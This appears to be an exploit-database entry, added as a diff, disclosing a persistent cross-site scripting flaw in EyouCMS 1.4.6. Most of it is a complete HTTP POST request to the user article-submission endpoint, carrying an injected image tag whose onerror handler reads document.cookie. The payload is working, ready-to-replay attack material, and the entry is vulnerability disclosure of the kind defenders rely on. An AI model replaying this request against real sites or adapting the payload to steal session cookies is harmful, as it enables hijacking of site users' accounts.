@@ -1,0 +1,30 @@
+# Exploit Title: EyouCMS 1.4.6 - Persistent Cross-Site Scripting
+# Date: 2020-05-28
+# Exploit Author: China Banking and Insurance Information Technology Management Co.,Ltd.
+# Vendor Homepage: https://eyoucms.com
+# Software Link: https://qiniu.eyoucms.com/EyouCMS-V1.4.6-UTF8-SP2.zip
+# Version: EyouCMS V1.4.6
+# Tested on: Windows
+# CVE : N/A
+
+Vulnerable Request:
+POST /EyouCMS/index.php?m=user&c=UsersRelease&a=article_add HTTP/1.1
+Host: 192.168.31.244
+Content-Length: 131
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://192.168.31.244
+Referer: http://192.168.31.244/EyouCMS/index.php?m=user&c=UsersRelease&a=article_add
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: users_id=4; home_lang=cn; admin_lang=cn; PHPSESSID=mahba3d6smn8d400pedi9n9gl0; referurl=http%3A%2F%2F192.168.31.244%2FEyouCMS%2Findex.php
+Connection: close
+
+title=test&typeid=9&tags=&litpic_inpiut=&addonFieldExt%5Bcontent%5D=111<img src=1 onerror=alert(document.cookie)>&__token__=b90d4bf2356b81f65284238857b91ada
+
+
+
+王新峰    技术管理部
+中国银行保险信息技术管理有限公司
